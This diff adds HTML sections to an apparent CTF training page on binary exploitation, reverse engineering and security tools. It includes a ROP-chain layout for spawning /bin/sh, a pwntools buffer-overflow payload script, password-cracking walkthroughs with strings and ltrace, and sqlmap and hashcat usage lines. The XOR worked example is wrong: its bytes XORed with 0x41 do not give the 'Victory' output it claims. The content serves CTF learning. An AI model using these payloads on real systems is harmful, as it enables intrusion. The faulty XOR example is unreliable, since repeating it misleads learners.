+                <h4 style="color: #e67e22; margin-top: 0;">ROP Chain Example: Calling system("/bin/sh")</h4>
+                <div style="font-family: monospace; color: #b8c5d6; font-size: 0.9rem;">
+                    <p style="color: #888;">Stack layout (bottom to top):</p>
+                    <p>┌─────────────────────────────────────┐</p>
+                    <p>│ padding (overflow buffer)           │</p>
+                    <p>├─────────────────────────────────────┤</p>
+                    <p>│ <span style="color: #3498db;">pop rdi; ret</span> gadget address       │</p>
+                    <p>├─────────────────────────────────────┤</p>
+                    <p>│ <span style="color: #27ae60;">"/bin/sh" string address</span>          │</p>
+                    <p>├─────────────────────────────────────┤</p>
+                    <p>│ <span style="color: #e74c3c;">system() address</span>                   │</p>
+                    <p>└─────────────────────────────────────┘</p>
+                </div>
+            </div>
+
+            <h3>Essential Tools</h3>
+            <div class="alert-box alert-success">
+                <div class="alert-title">Binary Exploitation Toolkit</div>
+                <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(180px, 1fr)); gap: 1rem;">
+                    <div>
+                        <strong>pwntools</strong>
+                        <p style="margin: 0.25rem 0; font-size: 0.9rem;">Python exploitation framework</p>
+                    </div>
+                    <div>
+                        <strong>GDB + pwndbg/GEF</strong>
+                        <p style="margin: 0.25rem 0; font-size: 0.9rem;">Enhanced debugging</p>
+                    </div>
+                    <div>
+                        <strong>ROPgadget</strong>
+                        <p style="margin: 0.25rem 0; font-size: 0.9rem;">Find ROP gadgets</p>
+                    </div>
+                    <div>
+                        <strong>checksec</strong>
+                        <p style="margin: 0.25rem 0; font-size: 0.9rem;">Check binary protections</p>
+                    </div>
+                    <div>
+                        <strong>one_gadget</strong>
+                        <p style="margin: 0.25rem 0; font-size: 0.9rem;">Find one-shot shell gadgets</p>
+                    </div>
+                    <div>
+                        <strong>patchelf</strong>
+                        <p style="margin: 0.25rem 0; font-size: 0.9rem;">Modify ELF binaries</p>
+                    </div>
+                </div>
+            </div>
+
+            <h3>Pwntools Example</h3>
+            <div style="background: #0d1117; padding: 1.5rem; border-radius: 8px; margin: 1.5rem 0; font-family: monospace; font-size: 0.85rem;">
+                <p style="color: #ff7b72;">from</p><p style="color: #f0f6fc; display: inline;"> pwn </p><p style="color: #ff7b72; display: inline;">import</p><p style="color: #f0f6fc; display: inline;"> *</p>
+                <br><br>
+                <p style="color: #7ee787;"># Set up the target</p>
+                <p style="color: #f0f6fc;">elf = ELF('./vulnerable')</p>
+                <p style="color: #f0f6fc;">p = process('./vulnerable')  <span style="color: #7ee787;"># or remote('ip', port)</span></p>
+                <br>
+                <p style="color: #7ee787;"># Build payload</p>
+                <p style="color: #f0f6fc;">payload = b'A' * 72  <span style="color: #7ee787;"># Offset to return address</span></p>
+                <p style="color: #f0f6fc;">payload += p64(elf.symbols['win'])  <span style="color: #7ee787;"># Overwrite with win function</span></p>
+                <br>
+                <p style="color: #7ee787;"># Send and interact</p>
+                <p style="color: #f0f6fc;">p.sendline(payload)</p>
+                <p style="color: #f0f6fc;">p.interactive()</p>
+            </div>
+        </section>
+         <section id="tab-rev-eng" class="tab-content">
+            <h2>Reverse Engineering</h2>
+            <p>Reverse engineering involves analyzing compiled binaries to understand their behavior without access to source code. It's essential for finding vulnerabilities, understanding malware, and solving CTF challenges.</p>
+
+            <div style="background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%); padding: 2rem; border-radius: 12px; margin: 2rem 0;">
+                <h3 style="color: #9b59b6; margin-top: 0; text-align: center;">Reverse Engineering Process</h3>
+                <svg viewBox="0 0 700 80" style="max-width: 100%; height: auto;">
+                    <rect x="10" y="15" width="100" height="50" rx="8" fill="#3498db"/>
+                    <text x="60" y="45" text-anchor="middle" fill="white" font-weight="bold" font-size="10">Binary</text>
+                    
+                    <path d="M 115 40 L 135 40" stroke="#ecf0f1" stroke-width="2" marker-end="url(#arrowRE)"/>
+                    
+                    <rect x="140" y="15" width="110" height="50" rx="8" fill="#9b59b6"/>
+                    <text x="195" y="45" text-anchor="middle" fill="white" font-weight="bold" font-size="10">Disassembly</text>
+                    
+                    <path d="M 255 40 L 275 40" stroke="#ecf0f1" stroke-width="2" marker-end="url(#arrowRE)"/>
+                    
+                    <rect x="280" y="15" width="110" height="50" rx="8" fill="#e67e22"/>
+                    <text x="335" y="45" text-anchor="middle" fill="white" font-weight="bold" font-size="10">Decompilation</text>
+                    
+                    <path d="M 395 40 L 415 40" stroke="#ecf0f1" stroke-width="2" marker-end="url(#arrowRE)"/>
+                    
+                    <rect x="420" y="15" width="100" height="50" rx="8" fill="#e74c3c"/>
+                    <text x="470" y="45" text-anchor="middle" fill="white" font-weight="bold" font-size="10">Analysis</text>
+                    
+                    <path d="M 525 40 L 545 40" stroke="#ecf0f1" stroke-width="2" marker-end="url(#arrowRE)"/>
+                    
+                    <rect x="550" y="15" width="100" height="50" rx="8" fill="#27ae60"/>
+                    <text x="600" y="45" text-anchor="middle" fill="white" font-weight="bold" font-size="10">Understanding</text>
+                    
+                    <defs>
+                        <marker id="arrowRE" markerWidth="10" markerHeight="10" refX="9" refY="3" orient="auto">
+                            <path d="M0,0 L0,6 L9,3 z" fill="#ecf0f1"/>
+                        </marker>
+                    </defs>
+                </svg>
+            </div>
+
+            <h3>Assembly Language Basics</h3>
+            <p>Understanding assembly is crucial for reverse engineering. Here are the most common x86_64 instructions you'll encounter:</p>
+
+            <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 1.5rem; margin: 1.5rem 0;">
+                <div style="background: #1a1a2e; padding: 1.5rem; border-radius: 8px;">
+                    <h4 style="color: #3498db; margin-top: 0;">Data Movement</h4>
+                    <table style="width: 100%; color: #b8c5d6; font-family: monospace; font-size: 0.85rem;">
+                        <tr><td><code style="color: #27ae60;">mov rax, rbx</code></td><td>Copy rbx to rax</td></tr>
+                        <tr><td><code style="color: #27ae60;">lea rax, [rbx+8]</code></td><td>Load address into rax</td></tr>
+                        <tr><td><code style="color: #27ae60;">push rax</code></td><td>Push rax onto stack</td></tr>
+                        <tr><td><code style="color: #27ae60;">pop rax</code></td><td>Pop from stack to rax</td></tr>
+                    </table>
+                </div>
+                <div style="background: #1a1a2e; padding: 1.5rem; border-radius: 8px;">
+                    <h4 style="color: #9b59b6; margin-top: 0;">Arithmetic</h4>
+                    <table style="width: 100%; color: #b8c5d6; font-family: monospace; font-size: 0.85rem;">
+                        <tr><td><code style="color: #e67e22;">add rax, 5</code></td><td>rax = rax + 5</td></tr>
+                        <tr><td><code style="color: #e67e22;">sub rax, rbx</code></td><td>rax = rax - rbx</td></tr>
+                        <tr><td><code style="color: #e67e22;">inc rax</code></td><td>rax = rax + 1</td></tr>
+                        <tr><td><code style="color: #e67e22;">xor rax, rax</code></td><td>rax = 0 (fast zero)</td></tr>
+                    </table>
+                </div>
+                <div style="background: #1a1a2e; padding: 1.5rem; border-radius: 8px;">
+                    <h4 style="color: #e74c3c; margin-top: 0;">Control Flow</h4>
+                    <table style="width: 100%; color: #b8c5d6; font-family: monospace; font-size: 0.85rem;">
+                        <tr><td><code style="color: #f1c40f;">cmp rax, rbx</code></td><td>Compare rax and rbx</td></tr>
+                        <tr><td><code style="color: #f1c40f;">jmp label</code></td><td>Unconditional jump</td></tr>
+                        <tr><td><code style="color: #f1c40f;">je/jz label</code></td><td>Jump if equal/zero</td></tr>
+                        <tr><td><code style="color: #f1c40f;">jne/jnz label</code></td><td>Jump if not equal</td></tr>
+                    </table>
+                </div>
+                <div style="background: #1a1a2e; padding: 1.5rem; border-radius: 8px;">
+                    <h4 style="color: #27ae60; margin-top: 0;">Function Calls</h4>
+                    <table style="width: 100%; color: #b8c5d6; font-family: monospace; font-size: 0.85rem;">
+                        <tr><td><code style="color: #3498db;">call func</code></td><td>Call function</td></tr>
+                        <tr><td><code style="color: #3498db;">ret</code></td><td>Return from function</td></tr>
+                        <tr><td><code style="color: #3498db;">nop</code></td><td>No operation</td></tr>
+                        <tr><td><code style="color: #3498db;">syscall</code></td><td>System call</td></tr>
+                    </table>
+                </div>
+            </div>
+
+            <h3>Essential RE Tools</h3>
+            <div class="category-grid">
+                <div class="category-card" style="border-left: 4px solid #e74c3c;">
+                    <h4 style="color: #e74c3c;">Ghidra (Free)</h4>
+                    <p>NSA's powerful reverse engineering suite. Excellent decompiler for C/C++.</p>
+                    <p><a href="https://ghidra-sre.org/" target="_blank" style="color: #3498db;">ghidra-sre.org</a></p>
+                </div>
+                <div class="category-card" style="border-left: 4px solid #3498db;">
+                    <h4 style="color: #3498db;">IDA Pro / IDA Free</h4>
+                    <p>Industry-standard disassembler. Free version available for learning.</p>
+                </div>
+                <div class="category-card" style="border-left: 4px solid #9b59b6;">
+                    <h4 style="color: #9b59b6;">Binary Ninja</h4>
+                    <p>Modern RE platform with excellent UI and scripting support.</p>
+                </div>
+                <div class="category-card" style="border-left: 4px solid #27ae60;">
+                    <h4 style="color: #27ae60;">radare2 / Cutter</h4>
+                    <p>Free, open-source RE framework. Cutter provides GUI interface.</p>
+                </div>
+            </div>
+
+            <!-- Worked Example Section -->
+            <div style="background: linear-gradient(135deg, #3d2a1a 0%, #1a1a2e 100%); padding: 2rem; border-radius: 12px; margin: 2rem 0; border: 2px solid #e67e22;">
+                <h3 style="color: #e67e22; margin-top: 0;"> Worked Example: Cracking a Password Check</h3>
+                <p style="color: #b8c5d6;"><strong>Scenario:</strong> A binary asks for a password. Enter the correct one to get the flag.</p>
+                
+                <div style="background: #0d1117; padding: 1rem; border-radius: 8px; margin: 1rem 0; font-family: monospace;">
+                    <p style="color: #7ee787;"># Step 1: Check for hardcoded strings</p>
+                    <p style="color: #f0f6fc;">$ strings ./password_check | grep -E ".{5,}"</p>
+                    <p style="color: #888;">Enter password:<br>s3cr3t_p4ss<br>Correct! Here's your flag<br>Wrong password!</p>
+                    <p style="color: #27ae60;"><strong>Found it!</strong> The password is likely "s3cr3t_p4ss"</p>
+                </div>
+                
+                <div style="background: #0d1117; padding: 1rem; border-radius: 8px; margin: 1rem 0; font-family: monospace;">
+                    <p style="color: #7ee787;"># Step 2: If not in strings, use ltrace to see comparisons</p>
+                    <p style="color: #f0f6fc;">$ ltrace ./password_check</p>
+                    <p style="color: #888;">puts("Enter password: ")<br>fgets("test\n", 50, 0x...)<br>strcmp("test\n", "s3cr3t_p4ss\n") = -1</p>
+                    <p style="color: #27ae60;"><strong>The strcmp reveals the expected password!</strong></p>
+                </div>
+                
+                <div style="background: #0d1117; padding: 1rem; border-radius: 8px; margin: 1rem 0; font-family: monospace;">
+                    <p style="color: #7ee787;"># Step 3: In Ghidra, look for the check function</p>
+                    <p style="color: #f0f6fc;">// Decompiled code often shows:</p>
+                    <p style="color: #888;">if (strcmp(user_input, "s3cr3t_p4ss") == 0) {<br>    print_flag();<br>}</p>
+                </div>
+            </div>
+
+            <div style="background: linear-gradient(135deg, #3d2a1a 0%, #1a1a2e 100%); padding: 2rem; border-radius: 12px; margin: 2rem 0; border: 2px solid #3498db;">
+                <h3 style="color: #3498db; margin-top: 0;"> Worked Example: XOR Decryption</h3>
+                <p style="color: #b8c5d6;"><strong>Scenario:</strong> The binary XORs each character of your input with a key and compares to encrypted data.</p>
+                
+                <div style="background: #0d1117; padding: 1rem; border-radius: 8px; margin: 1rem 0; font-family: monospace;">
+                    <p style="color: #7ee787;"># From Ghidra, you find encrypted bytes and XOR key</p>
+                    <p style="color: #f0f6fc;">encrypted = [0x17, 0x0c, 0x06, 0x18, 0x32, 0x21, 0x35]</p>
+                    <p style="color: #f0f6fc;">key = 0x41  # 'A'</p>
+                </div>
+                
+                <div style="background: #0d1117; padding: 1rem; border-radius: 8px; margin: 1rem 0; font-family: monospace; font-size: 0.85rem;">
+                    <p style="color: #7ee787;"># Python script to decrypt:</p>
+                    <pre style="color: #f0f6fc; margin: 0;">encrypted = [0x17, 0x0c, 0x06, 0x18, 0x32, 0x21, 0x35]
+key = 0x41
+
+decrypted = ''.join(chr(b ^ key) for b in encrypted)
+print(decrypted)  <span style="color: #7ee787;"># Output: Victory</span></pre>
+                </div>
+                
+                <p style="color: #f1c40f;"><strong>Remember:</strong> XOR is reversible! plaintext ⊕ key = cipher, and cipher ⊕ key = plaintext</p>
+            </div>
+
+            <h3>Static Analysis Approach</h3>
+            <p>Analyze the binary without executing it. Safe and allows understanding of the entire program.</p>
+
+            <div style="background: linear-gradient(135deg, #2d2d44 0%, #1a1a2e 100%); padding: 1.5rem; border-radius: 8px; margin: 1.5rem 0;">
+                <h4 style="color: #f1c40f; margin-top: 0;">Static Analysis Workflow</h4>
+                <ol style="color: #b8c5d6;">
+                    <li><strong>Identify the binary:</strong> <code>file binary</code> - Check architecture, format</li>
+                    <li><strong>Check strings:</strong> <code>strings binary | grep -i flag</code></li>
+                    <li><strong>Find entry point:</strong> Look for <code>main()</code> or <code>_start</code></li>
+                    <li><strong>Identify key functions:</strong> strcmp, memcmp, encryption functions</li>
+                    <li><strong>Trace data flow:</strong> Follow user input through the program</li>
+                    <li><strong>Understand logic:</strong> Map out conditionals and loops</li>
+                    <li><strong>Find the check:</strong> Locate where success/failure is determined</li>
+                </ol>
+            </div>
+
+            <h3>Dynamic Analysis Approach</h3>
+            <p>Execute and observe the binary's behavior at runtime using a debugger.</p>
+
+            <div style="background: #0d1117; padding: 1.5rem; border-radius: 8px; margin: 1.5rem 0; font-family: monospace;">
+                <p style="color: #7ee787; margin-bottom: 0.5rem;"># Start GDB with pwndbg</p>
+                <p style="color: #f0f6fc;">gdb ./binary</p>
+                <br>
+                <p style="color: #7ee787; margin-bottom: 0.5rem;"># Set breakpoint at main</p>
+                <p style="color: #f0f6fc;">(gdb) break main</p>
+                <p style="color: #f0f6fc;">(gdb) break *0x401234  # At specific address</p>
+                <br>
+                <p style="color: #7ee787; margin-bottom: 0.5rem;"># Run and step through</p>
+                <p style="color: #f0f6fc;">(gdb) run</p>
+                <p style="color: #f0f6fc;">(gdb) ni  # Next instruction</p>
+                <p style="color: #f0f6fc;">(gdb) si  # Step into</p>
+                <p style="color: #f0f6fc;">(gdb) continue  # Continue to next breakpoint</p>
+                <br>
+                <p style="color: #7ee787; margin-bottom: 0.5rem;"># Examine memory and registers</p>
+                <p style="color: #f0f6fc;">(gdb) info registers</p>
+                <p style="color: #f0f6fc;">(gdb) x/20x $rsp  # Examine 20 hex words at stack pointer</p>
+                <p style="color: #f0f6fc;">(gdb) x/s $rdi    # Examine string at rdi</p>
+            </div>
+
+            <h3>Common RE Challenges</h3>
+            <div class="category-grid">
+                <div class="category-card">
+                    <h4>Password/Key Check</h4>
+                    <p>Find the comparison function, extract or bypass the expected value.</p>
+                    <p><strong>Look for:</strong> strcmp, memcmp, XOR loops</p>
+                </div>
+                <div class="category-card">
+                    <h4>License Key Validation</h4>
+                    <p>Understand the algorithm that validates keys, then generate valid ones.</p>
+                    <p><strong>Look for:</strong> Mathematical operations, checksums</p>
+                </div>
+                <div class="category-card">
+                    <h4>Obfuscated Code</h4>
+                    <p>Code intentionally made hard to understand. Deobfuscate step by step.</p>
+                    <p><strong>Look for:</strong> Packed/encrypted code sections</p>
+                </div>
+                <div class="category-card">
+                    <h4>Custom Encryption</h4>
+                    <p>Analyze and reverse the encryption algorithm to decrypt the flag.</p>
+                    <p><strong>Look for:</strong> XOR, substitution, custom algorithms</p>
+                </div>
+            </div>
+
+            <h3>RE Tips & Tricks</h3>
+            <div class="alert-box alert-success">
+                <div class="alert-title">Tips for Reverse Engineering</div>
+                <ul>
+                    <li><strong>Start with strings:</strong> Often reveals key info, passwords, or the flag format</li>
+                    <li><strong>Find the win condition:</strong> Look for success messages and trace backwards</li>
+                    <li><strong>Rename functions/variables:</strong> As you understand them, rename for clarity</li>
+                    <li><strong>Take notes:</strong> Document your understanding as you go</li>
+                    <li><strong>Use cross-references:</strong> See where functions/strings are used</li>
+                    <li><strong>Patch the binary:</strong> Sometimes easier to NOP out checks than solve them</li>
+                    <li><strong>Dynamic + Static:</strong> Combine both approaches for best results</li>
+                </ul>
+            </div>
+
+            <h3>Quick Commands</h3>
+            <div style="background: #0d1117; padding: 1.5rem; border-radius: 8px; margin: 1.5rem 0; font-family: monospace;">
+                <p style="color: #7ee787; margin-bottom: 0.5rem;"># Get file information</p>
+                <p style="color: #f0f6fc;">file binary && checksec binary</p>
+                <br>
+                <p style="color: #7ee787; margin-bottom: 0.5rem;"># Extract all strings</p>
+                <p style="color: #f0f6fc;">strings -n 6 binary | less</p>
+                <br>
+                <p style="color: #7ee787; margin-bottom: 0.5rem;"># List functions (with radare2)</p>
+                <p style="color: #f0f6fc;">r2 -c "aaa; afl" binary</p>
+                <br>
+                <p style="color: #7ee787; margin-bottom: 0.5rem;"># Disassemble main (with objdump)</p>
+                <p style="color: #f0f6fc;">objdump -d binary | grep -A50 "&lt;main&gt;:"</p>
+                <br>
+                <p style="color: #7ee787; margin-bottom: 0.5rem;"># View library calls</p>
+                <p style="color: #f0f6fc;">ltrace ./binary</p>
+                <p style="color: #f0f6fc;">strace ./binary</p>
+            </div>
+        </section>
+         <section id="tab-essential" class="tab-content">
+            <h2>Essential CTF Tools</h2>
+            <p>Having the right tools ready is crucial for CTF success. This section covers the essential tools organized by category, with installation instructions and quick-start examples.</p>
+
+            <div class="alert-box alert-success">
+                <div class="alert-title">Quick Setup Recommendation</div>
+                <p>Use a dedicated CTF virtual machine with Kali Linux or Parrot OS—they come pre-installed with most of these tools. Alternatively, set up a Ubuntu VM and install tools as needed.</p>
+            </div>
+
+            <h3>Web Exploitation Tools</h3>
+            <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(350px, 1fr)); gap: 1.5rem; margin: 1.5rem 0;">
+                <div style="background: #1a1a2e; padding: 1.5rem; border-radius: 8px; border-left: 4px solid #3498db;">
+                    <h4 style="color: #3498db; margin-top: 0;">Burp Suite</h4>
+                    <p style="color: #b8c5d6; font-size: 0.9rem;">Industry-standard web proxy for intercepting and modifying HTTP traffic.</p>
+                    <p style="color: #888; font-size: 0.85rem; margin-bottom: 0.5rem;"><strong>Install:</strong></p>
+                    <code style="display: block; background: #0d1117; padding: 0.5rem; border-radius: 4px; font-size: 0.8rem;">
+                        # Download from portswigger.net<br>
+                        # Community Edition is free
+                    </code>
+                    <p style="color: #888; font-size: 0.85rem; margin-top: 0.5rem;"><strong>Key Features:</strong> Proxy, Repeater, Intruder, Decoder</p>
+                </div>
+                <div style="background: #1a1a2e; padding: 1.5rem; border-radius: 8px; border-left: 4px solid #27ae60;">
+                    <h4 style="color: #27ae60; margin-top: 0;">SQLMap</h4>
+                    <p style="color: #b8c5d6; font-size: 0.9rem;">Automatic SQL injection detection and exploitation tool.</p>
+                    <p style="color: #888; font-size: 0.85rem; margin-bottom: 0.5rem;"><strong>Install:</strong></p>
+                    <code style="display: block; background: #0d1117; padding: 0.5rem; border-radius: 4px; font-size: 0.8rem;">
+                        sudo apt install sqlmap<br>
+                        # or: pip install sqlmap
+                    </code>
+                    <p style="color: #888; font-size: 0.85rem; margin-top: 0.5rem;"><strong>Usage:</strong> <code>sqlmap -u "url?id=1" --dbs</code></p>
+                </div>
+                <div style="background: #1a1a2e; padding: 1.5rem; border-radius: 8px; border-left: 4px solid #9b59b6;">
+                    <h4 style="color: #9b59b6; margin-top: 0;">Gobuster / Dirbuster</h4>
+                    <p style="color: #b8c5d6; font-size: 0.9rem;">Directory and file brute-forcing tools for web reconnaissance.</p>
+                    <p style="color: #888; font-size: 0.85rem; margin-bottom: 0.5rem;"><strong>Install:</strong></p>
+                    <code style="display: block; background: #0d1117; padding: 0.5rem; border-radius: 4px; font-size: 0.8rem;">
+                        sudo apt install gobuster<br>
+                        # or: go install github.com/OJ/gobuster/v3@latest
+                    </code>
+                    <p style="color: #888; font-size: 0.85rem; margin-top: 0.5rem;"><strong>Usage:</strong> <code>gobuster dir -u URL -w wordlist</code></p>
+                </div>
+                <div style="background: #1a1a2e; padding: 1.5rem; border-radius: 8px; border-left: 4px solid #e67e22;">
+                    <h4 style="color: #e67e22; margin-top: 0;">curl & HTTPie</h4>
+                    <p style="color: #b8c5d6; font-size: 0.9rem;">Command-line HTTP clients for crafting custom requests.</p>
+                    <p style="color: #888; font-size: 0.85rem; margin-bottom: 0.5rem;"><strong>Install:</strong></p>
+                    <code style="display: block; background: #0d1117; padding: 0.5rem; border-radius: 4px; font-size: 0.8rem;">
+                        sudo apt install curl httpie
+                    </code>
+                    <p style="color: #888; font-size: 0.85rem; margin-top: 0.5rem;"><strong>Usage:</strong> <code>curl -X POST -d "data" URL</code></p>
+                </div>
+            </div>
+
+            <h3>Cryptography Tools</h3>
+            <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(350px, 1fr)); gap: 1.5rem; margin: 1.5rem 0;">
+                <div style="background: #1a1a2e; padding: 1.5rem; border-radius: 8px; border-left: 4px solid #f1c40f;">
+                    <h4 style="color: #f1c40f; margin-top: 0;">CyberChef</h4>
+                    <p style="color: #b8c5d6; font-size: 0.9rem;">Web-based tool for encoding, decoding, encryption, and data analysis.</p>
+                    <p style="color: #888; font-size: 0.85rem;"><strong>Access:</strong> <a href="https://gchq.github.io/CyberChef/" target="_blank" style="color: #3498db;">gchq.github.io/CyberChef</a></p>
+                    <p style="color: #888; font-size: 0.85rem; margin-top: 0.5rem;"><strong>Features:</strong> Drag-and-drop operations, recipe chaining</p>
+                </div>
+                <div style="background: #1a1a2e; padding: 1.5rem; border-radius: 8px; border-left: 4px solid #e74c3c;">
+                    <h4 style="color: #e74c3c; margin-top: 0;">RsaCtfTool</h4>
+                    <p style="color: #b8c5d6; font-size: 0.9rem;">Automated RSA attack tool for CTF challenges.</p>
+                    <p style="color: #888; font-size: 0.85rem; margin-bottom: 0.5rem;"><strong>Install:</strong></p>
+                    <code style="display: block; background: #0d1117; padding: 0.5rem; border-radius: 4px; font-size: 0.8rem;">
+                        git clone https://github.com/RsaCtfTool/RsaCtfTool<br>
+                        pip install -r requirements.txt
+                    </code>
+                </div>
+                <div style="background: #1a1a2e; padding: 1.5rem; border-radius: 8px; border-left: 4px solid #27ae60;">
+                    <h4 style="color: #27ae60; margin-top: 0;">hashcat / John the Ripper</h4>
+                    <p style="color: #b8c5d6; font-size: 0.9rem;">Password cracking tools supporting many hash types.</p>
+                    <p style="color: #888; font-size: 0.85rem; margin-bottom: 0.5rem;"><strong>Install:</strong></p>
+                    <code style="display: block; background: #0d1117; padding: 0.5rem; border-radius: 4px; font-size: 0.8rem;">
+                        sudo apt install hashcat john
+                    </code>
+                </div>
+                <div style="background: #1a1a2e; padding: 1.5rem; border-radius: 8px; border-left: 4px solid #9b59b6;">
+                    <h4 style="color: #9b59b6; margin-top: 0;">dCode</h4>
+                    <p style="color: #b8c5d6; font-size: 0.9rem;">Online cipher identifier and solver with many classical ciphers.</p>
+                    <p style="color: #888; font-size: 0.85rem;"><strong>Access:</strong> <a href="https://www.dcode.fr/" target="_blank" style="color: #3498db;">dcode.fr</a></p>
+                </div>
+            </div>
+
+            <h3>Forensics & Steganography Tools</h3>
+            <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(350px, 1fr)); gap: 1.5rem; margin: 1.5rem 0;">
+                <div style="background: #1a1a2e; padding: 1.5rem; border-radius: 8px; border-left: 4px solid #3498db;">
+                    <h4 style="color: #3498db; margin-top: 0;">binwalk</h4>
+                    <p style="color: #b8c5d6; font-size: 0.9rem;">Firmware analysis and file carving tool.</p>
+                    <p style="color: #888; font-size: 0.85rem; margin-bottom: 0.5rem;"><strong>Install:</strong></p>
+                    <code style="display: block; background: #0d1117; padding: 0.5rem; border-radius: 4px; font-size: 0.8rem;">sudo apt install binwalk</code>
+                    <p style="color: #888; font-size: 0.85rem; margin-top: 0.5rem;"><strong>Usage:</strong> <code>binwalk -e file</code> (extract embedded files)</p>
+                </div>
+                <div style="background: #1a1a2e; padding: 1.5rem; border-radius: 8px; border-left: 4px solid #27ae60;">
+                    <h4 style="color: #27ae60; margin-top: 0;">exiftool</h4>
+                    <p style="color: #b8c5d6; font-size: 0.9rem;">Read and write metadata in image files.</p>
+                    <p style="color: #888; font-size: 0.85rem; margin-bottom: 0.5rem;"><strong>Install:</strong></p>
+                    <code style="display: block; background: #0d1117; padding: 0.5rem; border-radius: 4px; font-size: 0.8rem;">sudo apt install exiftool</code>
+                    <p style="color: #888; font-size: 0.85rem; margin-top: 0.5rem;"><strong>Usage:</strong> <code>exiftool image.jpg</code></p>
+                </div>
+                <div style="background: #1a1a2e; padding: 1.5rem; border-radius: 8px; border-left: 4px solid #9b59b6;">
+                    <h4 style="color: #9b59b6; margin-top: 0;">zsteg</h4>
+                    <p style="color: #b8c5d6; font-size: 0.9rem;">LSB steganography detection for PNG/BMP files.</p>
+                    <p style="color: #888; font-size: 0.85rem; margin-bottom: 0.5rem;"><strong>Install:</strong></p>
+                    <code style="display: block; background: #0d1117; padding: 0.5rem; border-radius: 4px; font-size: 0.8rem;">gem install zsteg</code>
+                    <p style="color: #888; font-size: 0.85rem; margin-top: 0.5rem;"><strong>Usage:</strong> <code>zsteg image.png</code></p>
+                </div>
+                <div style="background: #1a1a2e; padding: 1.5rem; border-radius: 8px; border-left: 4px solid #e67e22;">
+                    <h4 style="color: #e67e22; margin-top: 0;">Volatility</h4>
+                    <p style="color: #b8c5d6; font-size: 0.9rem;">Memory forensics framework for analyzing RAM dumps.</p>
+                    <p style="color: #888; font-size: 0.85rem; margin-bottom: 0.5rem;"><strong>Install:</strong></p>
+                    <code style="display: block; background: #0d1117; padding: 0.5rem; border-radius: 4px; font-size: 0.8rem;">pip install volatility3</code>
+                </div>
+                <div style="background: #1a1a2e; padding: 1.5rem; border-radius: 8px; border-left: 4px solid #e74c3c;">
+                    <h4 style="color: #e74c3c; margin-top: 0;">Wireshark</h4>
+                    <p style="color: #b8c5d6; font-size: 0.9rem;">Network protocol analyzer for PCAP files.</p>
+                    <p style="color: #888; font-size: 0.85rem; margin-bottom: 0.5rem;"><strong>Install:</strong></p>
+                    <code style="display: block; background: #0d1117; padding: 0.5rem; border-radius: 4px; font-size: 0.8rem;">sudo apt install wireshark</code>
+                </div>
+                <div style="background: #1a1a2e; padding: 1.5rem; border-radius: 8px; border-left: 4px solid #f1c40f;">
+                    <h4 style="color: #f1c40f; margin-top: 0;">Audacity</h4>
+                    <p style="color: #b8c5d6; font-size: 0.9rem;">Audio editor for spectrogram analysis.</p>
+                    <p style="color: #888; font-size: 0.85rem; margin-bottom: 0.5rem;"><strong>Install:</strong></p>
+                    <code style="display: block; background: #0d1117; padding: 0.5rem; border-radius: 4px; font-size: 0.8rem;">sudo apt install audacity</code>
+                </div>
+            </div>
+
+            <h3>Binary Exploitation & RE Tools</h3>
+            <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(350px, 1fr)); gap: 1.5rem; margin: 1.5rem 0;">
+                <div style="background: #1a1a2e; padding: 1.5rem; border-radius: 8px; border-left: 4px solid #e74c3c;">
+                    <h4 style="color: #e74c3c; margin-top: 0;">pwntools</h4>
+                    <p style="color: #b8c5d6; font-size: 0.9rem;">CTF framework for binary exploitation in Python.</p>
+                    <p style="color: #888; font-size: 0.85rem; margin-bottom: 0.5rem;"><strong>Install:</strong></p>
+                    <code style="display: block; background: #0d1117; padding: 0.5rem; border-radius: 4px; font-size: 0.8rem;">pip install pwntools</code>
+                    <p style="color: #888; font-size: 0.85rem; margin-top: 0.5rem;"><strong>Usage:</strong> <code>from pwn import *</code></p>
+                </div>
+                <div style="background: #1a1a2e; padding: 1.5rem; border-radius: 8px; border-left: 4px solid #9b59b6;">
+                    <h4 style="color: #9b59b6; margin-top: 0;">Ghidra</h4>
+                    <p style="color: #b8c5d6; font-size: 0.9rem;">NSA's free reverse engineering framework.</p>
+                    <p style="color: #888; font-size: 0.85rem;"><strong>Download:</strong> <a href="https://ghidra-sre.org/" target="_blank" style="color: #3498db;">ghidra-sre.org</a></p>
+                    <p style="color: #888; font-size: 0.85rem; margin-top: 0.5rem;"><strong>Features:</strong> Disassembler, decompiler, scripting</p>
+                </div>
+                <div style="background: #1a1a2e; padding: 1.5rem; border-radius: 8px; border-left: 4px solid #3498db;">
+                    <h4 style="color: #3498db; margin-top: 0;">GDB + pwndbg</h4>
+                    <p style="color: #b8c5d6; font-size: 0.9rem;">Enhanced GDB with pwn-focused features.</p>
+                    <p style="color: #888; font-size: 0.85rem; margin-bottom: 0.5rem;"><strong>Install:</strong></p>
+                    <code style="display: block; background: #0d1117; padding: 0.5rem; border-radius: 4px; font-size: 0.8rem;">
+                        git clone https://github.com/pwndbg/pwndbg<br>
+                        cd pwndbg && ./setup.sh
+                    </code>
+                </div>
+                <div style="background: #1a1a2e; padding: 1.5rem; border-radius: 8px; border-left: 4px solid #27ae60;">
+                    <h4 style="color: #27ae60; margin-top: 0;">ROPgadget</h4>
+                    <p style="color: #b8c5d6; font-size: 0.9rem;">Find ROP gadgets in binaries.</p>
+                    <p style="color: #888; font-size: 0.85rem; margin-bottom: 0.5rem;"><strong>Install:</strong></p>
+                    <code style="display: block; background: #0d1117; padding: 0.5rem; border-radius: 4px; font-size: 0.8rem;">pip install ROPgadget</code>
+                    <p style="color: #888; font-size: 0.85rem; margin-top: 0.5rem;"><strong>Usage:</strong> <code>ROPgadget --binary file</code></p>
+                </div>
+            </div>
+
+            <h3>Learning Resources</h3>
+            <div class="category-grid">
+                <div class="category-card">
+                    <h4>Practice Platforms</h4>
+                    <ul style="font-size: 0.9rem; color: var(--text-light);">
+                        <li><a href="https://picoctf.org/" target="_blank" style="color: #3498db;">picoCTF</a> - Beginner-friendly</li>
+                        <li><a href="https://overthewire.org/" target="_blank" style="color: #3498db;">OverTheWire</a> - Linux & security wargames</li>
+                        <li><a href="https://ctflearn.com/" target="_blank" style="color: #3498db;">CTFlearn</a> - Community challenges</li>
